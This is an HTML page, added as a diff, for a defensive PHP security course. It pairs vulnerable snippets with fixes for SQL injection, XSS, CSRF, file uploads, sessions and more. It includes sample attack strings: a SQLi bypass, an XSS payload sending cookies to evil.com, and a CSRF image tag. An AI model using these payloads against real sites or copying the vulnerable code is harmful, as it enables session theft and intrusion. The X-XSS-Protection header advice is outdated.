@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP Security — Cybersecurity Course</title>
+    <link rel="stylesheet" href="style.css">
+    <meta name="description" content="PHP Security course — learn how to protect your applications from the most common vulnerabilities.">
+</head>
+<body>
+
+<header>
+    <div class="logo">
+        <a href="index.html">BIT+</a>
+    </div>
+    <nav>
+        <a href="https://github.com/mu-b003" target="_blank">GitHub</a>
+        <a href="notes.html">Notes</a>
+    </nav>
+</header>
+
+<div class="ads-wrapper-layout">
+<div class="content-container">
+
+<details open>
+  <summary>Introduction — Why PHP Security?</summary>
+  <p>PHP powers over 77% of all websites on the internet. But poorly written code opens doors for attackers. In this course you will learn how to write secure PHP code and protect your applications from the most common vulnerabilities.</p>
+  <h3>What You Will Learn</h3>
+  <p>SQL Injection — XSS — CSRF — RCE — File Upload Attacks — Session Hijacking — and how to defend against each one with the right code.</p>
+  <h3>Requirements</h3>
+  <p>Basic knowledge of PHP and HTML. No prior security experience needed.</p>
+</details>
+
+<details open>
+  <summary>SQL Injection</summary>
+  <h3>What is SQL Injection?</h3>
+  <p>An attack that happens when the attacker inserts SQL commands into input fields instead of real data, allowing them to read, delete, or bypass authentication in your database.</p>
+
+  <h3>Vulnerable Code Example</h3>
+  <pre>
+//  Dangerous — user input directly in the query
+$user = $_GET['username'];
+$query = "SELECT * FROM users WHERE username = '$user'";
+  </pre>
+  <p>The attacker types: <code>' OR '1'='1</code> — and bypasses the password entirely!</p>
+
+  <h3>The Fix — Prepared Statements</h3>
+  <pre>
+//  Safe — use PDO with Prepared Statements
+$pdo = new PDO("mysql:host=localhost;dbname=mydb", $user, $pass);
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$_GET['username']]);
+$result = $stmt->fetch();
+  </pre>
+  <p>A Prepared Statement separates code from data — no matter what the attacker types, it is treated as plain text only.</p>
+
+  <h3>Golden Rules</h3>
+  <p> Always use PDO or MySQLi with Prepared Statements.</p>
+  <p> Never put any user input directly inside a SQL query.</p>
+  <p> Grant your database account the least privileges necessary (Principle of Least Privilege).</p>
+</details>
+
+<details>
+  <summary>XSS — Cross-Site Scripting</summary>
+  <h3>What is XSS?</h3>
+  <p>The attacker injects JavaScript code into a web page — it executes when the victim opens the page in their browser. Used to steal Cookies, hijack user sessions, or redirect victims to malicious sites.</p>
+
+  <h3>Vulnerable Code Example</h3>
+  <pre>
+//  Dangerous — outputting input directly
+echo "Hello " . $_GET['name'];
+  </pre>
+  <p>The attacker types: <code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code></p>
+
+  <h3>The Fix — htmlspecialchars</h3>
+  <pre>
+//  Safe — convert special characters
+echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+  </pre>
+
+  <h3>Content Security Policy (CSP)</h3>
+  <pre>
+// Add this header to block external script execution
+header("Content-Security-Policy: default-src 'self'");
+  </pre>
+
+  <h3>Golden Rules</h3>
+  <p> Use <code>htmlspecialchars()</code> on all user output.</p>
+  <p> Enable Content Security Policy.</p>
+  <p> Use HttpOnly and Secure flags on all Cookies.</p>
+</details>
+
+<details>
+  <summary>CSRF — Cross-Site Request Forgery</summary>
+  <h3>What is CSRF?</h3>
+  <p>The attacker tricks a logged-in user into executing a request without their knowledge — such as transferring money or changing their email — because the browser automatically sends Cookies with every request.</p>
+
+  <h3>Attack Example</h3>
+  <pre>
+&lt;!-- The attacker's page contains --&gt;
+&lt;img src="https://yourbank.com/transfer?to=attacker&amp;amount=1000"&gt;
+  </pre>
+  <p>As soon as the victim opens the page, the request fires using their session!</p>
+
+  <h3>The Fix — CSRF Token</h3>
+  <pre>
+// Generate a token in the Session
+session_start();
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
+// Inside the Form
+echo '&lt;input type="hidden" name="csrf_token"
+       value="' . $_SESSION['csrf_token'] . '"&gt;';
+
+// When processing the request
+if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
+    die("CSRF attack detected!");
+}
+  </pre>
+
+  <h3>Golden Rules</h3>
+  <p> Add a CSRF Token to every Form that modifies data.</p>
+  <p> Use <code>SameSite=Strict</code> in your Cookie settings.</p>
+  <p> Validate the Referer Header as an extra layer.</p>
+</details>
+
+<details>
+  <summary>File Upload Attacks</summary>
+  <h3>The Danger of File Uploads</h3>
+  <p>If you allow users to upload files without validation, an attacker can upload a malicious PHP file and execute it on the server — this is called Remote Code Execution (RCE).</p>
+
+  <h3>Vulnerable Code Example</h3>
+  <pre>
+//  Dangerous — no validation at all
+move_uploaded_file($_FILES['file']['tmp_name'],
+                   'uploads/' . $_FILES['file']['name']);
+  </pre>
+
+  <h3>The Secure Solution</h3>
+  <pre>
+$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
+$max_size = 2 * 1024 * 1024; // 2MB
+
+$file = $_FILES['upload'];
+
+// 1. Check the real MIME type (not just the extension)
+$finfo = new finfo(FILEINFO_MIME_TYPE);
+$mime = $finfo->file($file['tmp_name']);
+
+if (!in_array($mime, $allowed_types)) {
+    die("File type not allowed!");
+}
+
+// 2. Check file size
+if ($file['size'] > $max_size) {
+    die("File is too large!");
+}
+
+// 3. Rename the file randomly
+$ext = pathinfo($file['name'], PATHINFO_EXTENSION);
+$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
+
+// 4. Save outside the public folder if possible
+move_uploaded_file($file['tmp_name'], 'uploads/' . $new_name);
+  </pre>
+
+  <h3>Golden Rules</h3>
+  <p> Validate the real MIME type using <code>finfo</code>, not just the file extension.</p>
+  <p> Rename every uploaded file with a random name.</p>
+  <p> Do not store files in a publicly accessible folder unless they are images.</p>
+  <p> Add a <code>.htaccess</code> file in the upload folder to block PHP execution.</p>
+</details>
+
+<details>
+  <summary>Session Security</summary>
+  <h3>What is Session Hijacking?</h3>
+  <p>The attacker steals the Session ID to impersonate the user. This happens via XSS, insecure WiFi networks, or Session Fixation attacks.</p>
+
+  <h3>Secure Session Configuration</h3>
+  <pre>
+// At the top of every PHP file or in php.ini
+ini_set('session.cookie_httponly', 1);   // Prevent JS from reading the Cookie
+ini_set('session.cookie_secure', 1);     // HTTPS only
+ini_set('session.cookie_samesite', 'Strict');
+ini_set('session.use_strict_mode', 1);
+ini_set('session.gc_maxlifetime', 1800); // 30 minutes
+
+session_start();
+  </pre>
+
+  <h3>Session Regeneration</h3>
+  <pre>
+// Right after login — prevent Session Fixation
+session_start();
+session_regenerate_id(true); // true = delete the old session
+
+$_SESSION['user_id'] = $user['id'];
+$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
+$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
+  </pre>
+
+  <h3>Validate Session Identity</h3>
+  <pre>
+// On every request — verify the session belongs to the same device
+session_start();
+
+if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT'] ||
+    $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
+    session_destroy();
+    die("Session invalid — please login again.");
+}
+  </pre>
+
+  <h3>Golden Rules</h3>
+  <p> Always call <code>session_regenerate_id(true)</code> after login.</p>
+  <p> Enable HttpOnly and Secure flags on the Cookie.</p>
+  <p> Store User-Agent and IP in the session and verify them on each request.</p>
+  <p> Set a session expiry time.</p>
+</details>
+
+<details>
+  <summary>Password Hashing</summary>
+  <h3>Why Not Store Passwords as Plain Text?</h3>
+  <p>If your database leaks, the attacker gets every password immediately. The solution is to store a one-way Hash that cannot be reversed.</p>
+
+  <h3>The Correct Code</h3>
+  <pre>
+//  Hash the password on registration
+$hashed = password_hash($_POST['password'], PASSWORD_BCRYPT);
+// Store $hashed in the database
+
+//  Verify on login
+$user = $stmt->fetch(); // from the database
+if (password_verify($_POST['password'], $user['password'])) {
+    // Password is correct
+} else {
+    // Wrong password
+}
+  </pre>
+
+  <h3>Why PASSWORD_BCRYPT?</h3>
+  <p>BCrypt is intentionally slow — each attempt takes time, making Brute Force attacks practically impossible. PHP handles the Salt automatically.</p>
+
+  <h3>Golden Rules</h3>
+  <p> Use only <code>password_hash()</code> and <code>password_verify()</code> — never MD5 or SHA1.</p>
+  <p> Do not add a Salt manually — PHP does it automatically.</p>
+  <p> Use <code>PASSWORD_ARGON2ID</code> if available — stronger than BCrypt.</p>
+</details>
+
+<details>
+  <summary>Security Headers</summary>
+  <h3>What are Security Headers?</h3>
+  <p>Headers sent with every page that instruct the browser to enforce additional security policies — a free and important protection layer.</p>
+
+  <h3>Essential Headers</h3>
+  <pre>
+// Add at the top of every page or in a shared include file
+header("X-Frame-Options: DENY");                     // Prevent Clickjacking
+header("X-Content-Type-Options: nosniff");           // Prevent MIME Sniffing
+header("X-XSS-Protection: 1; mode=block");           // Browser XSS protection
+header("Referrer-Policy: strict-origin-when-cross-origin");
+header("Permissions-Policy: geolocation=(), microphone=()");
+header("Strict-Transport-Security: max-age=31536000; includeSubDomains"); // HTTPS only
+header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+  </pre>
+
+  <h3>Golden Rules</h3>
+  <p> Add these headers in a shared file included on every page.</p>
+  <p> Test your site at <a href="https://securityheaders.com" target="_blank">securityheaders.com</a>.</p>
+  <p> HSTS enforces HTTPS — do not enable it unless you have a valid SSL certificate.</p>
+</details>
+
+<details>
+  <summary>Error Handling and Information Disclosure</summary>
+  <h3>Why Are Error Messages Dangerous?</h3>
+  <p>Detailed error messages reveal to the attacker: file paths, database type, PHP version, and code structure — all golden information for launching an attack.</p>
+
+  <h3>Production Settings</h3>
+  <pre>
+// In php.ini or in code — production environment
+ini_set('display_errors', 0);        // Never show errors to the user
+ini_set('log_errors', 1);            // Log them to a file instead
+ini_set('error_log', '/var/log/php_errors.log'); // Safe path outside public
+
+// Development environment only
+// ini_set('display_errors', 1);
+// ini_set('error_reporting', E_ALL);
+  </pre>
+
+  <h3>Safe Error Handling</h3>
+  <pre>
+try {
+    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+    $stmt->execute([$id]);
+} catch (PDOException $e) {
+    // Log the detailed error internally only
+    error_log("DB Error: " . $e->getMessage());
+
+    // Show the user a generic message
+    die("Something went wrong. Please try again later.");
+}
+  </pre>
+
+  <h3>Golden Rules</h3>
+  <p> In production: disable display_errors completely.</p>
+  <p> Log errors to a file outside the web root.</p>
+  <p> Show users generic messages — never expose technical details.</p>
+</details>
+
+<details>
+  <summary>Security Checklist</summary>
+  <h3>Before Deploying Any PHP Project</h3>
+  <p> All SQL queries use Prepared Statements</p>
+  <p> All user output passes through htmlspecialchars()</p>
+  <p> All data-modifying Forms include a CSRF Token</p>
+  <p> File uploads validate the real MIME Type</p>
+  <p> Passwords are stored with password_hash() only</p>
+  <p> Sessions call session_regenerate_id() after login</p>
+  <p> Security Headers are added on every page</p>
+  <p> display_errors is disabled in production</p>
+  <p> HTTPS is enabled with a valid SSL certificate</p>
+  <p> Database account has minimum required privileges</p>
+</details>
+
+</div>
+</div>
+
+<footer class="site-footer">
+    <div class="footer-container">
+        <div class="footer-right">
+            <span>BIT+ Platform</span>
+            <span>|</span>
+            <span>&copy; 2026 All rights reserved.</span>
+        </div>
+        <div class="footer-left">
+            <a href="about.html">About Us</a>
+            <a href="privacy-policy.html">Privacy Policy</a>
+            <a href="contact.html">Contact Us</a>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
